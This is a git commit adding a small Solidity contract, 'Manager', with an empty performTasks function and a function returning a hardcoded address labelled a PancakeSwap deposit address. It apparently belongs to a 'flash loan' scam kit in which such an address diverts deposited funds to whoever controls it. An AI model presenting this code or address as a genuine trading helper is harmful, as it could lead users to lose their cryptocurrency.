a7de4001905285bf6f68a59b07fe967b0d02e372
flash-yield1 <88005249+flash-yield1@users.noreply.github.com>
2021-08-16 11:45:36 +0200

    Add files via upload

---
+++ manager.sol
@@ -0,0 +1,10 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+  function performTasks() public {
+  
+  }
+  function pancakeDepositAddress() public pure returns (address) {
+    return 0x77A48e949925e8f36F1a250617D4F86eabB13086;
+  }
+}
